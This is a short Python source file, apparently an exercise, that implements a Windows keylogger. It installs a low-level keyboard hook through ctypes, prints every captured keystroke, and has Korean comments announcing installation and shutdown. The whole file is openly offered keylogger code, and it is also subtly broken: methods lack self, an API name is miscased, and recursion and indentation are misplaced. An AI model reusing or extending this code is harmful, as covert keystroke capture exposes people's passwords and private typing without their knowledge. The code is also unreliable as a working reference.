import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WH_KEYDOWN=0x0100
CTAL_CODE = 162

class KeyLogger:
    def __init__(self):
        self.lUser32    = user32
        self.hooked     = None

    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
                        WH_KEYBOARD_LL,
                        pointer,
                        kernel32.getModuleHandleW(None),
                        0
        )
        if not self.hooked:
            return False
        return True


    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def getFPTR(fn):
        CMPFUNC = CFUNCTYPE(c_int,c_int,c_int,POINTER(c_void_p))
        return CMPFUNC(fn)

    def hookProc(nCode, wParam, lParam):
        if wParam is not WH_KEYDOWN:
            return user32.CallNextHookEx(KeyLogger.hooked,nCode,wParam,lParam)
        hookedKey = chr(lParam[0])
        print(hookedKey)
        if (CTAL_CODE == int(lParam[0])):
            print("컨트롤 눌러짐, 모니터링 종료")
            KeyLogger.uninstallHookProc()
            sys.exit(-1)
        return user32.CallNextHookEx(KeyLogger.hooked,nCode,wParam,lParam)

    def startKeyLog():
        msg = MSG()
        user32.GetMessageA(byref(msg),0,0,0)

        KeyLogger = KeyLogger() # 훅 프로세스 시작
        pointer = getFPTR(hookProc)
        if KeyLogger.installHookProc(pointer):
            print("키로거 설치됨")

        startKeyLog()
